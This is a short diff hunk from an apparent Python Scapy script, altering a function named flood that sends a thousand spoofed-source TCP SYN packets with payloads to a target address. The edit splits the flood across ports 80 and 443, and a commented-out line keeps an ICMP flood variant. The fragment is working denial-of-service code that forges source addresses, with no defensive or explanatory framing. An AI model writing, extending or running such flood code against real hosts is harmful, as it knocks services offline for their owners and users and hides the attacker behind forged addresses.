@@ -27,7 +27,8 @@ def flood(d_ip):
     for i in range(1000):
         s_ip = random_ip()
         s_port = random_port()
-        send(IP(dst=d_ip, src=s_ip) / TCP(sport=s_port, dport=80, flags='S')/payload*50,verbose=0)
+        send(IP(dst=d_ip, src=s_ip) / TCP(sport=s_port, dport=80, flags='S')/payload,verbose=0)
+        send(IP(dst=d_ip, src=s_ip) / TCP(sport=s_port, dport=443, flags='S')/payload,verbose=0)
        # send(IP(dst=d_ip, src=s_ip) / ICMP()/payload*50,verbose=0)
 
 
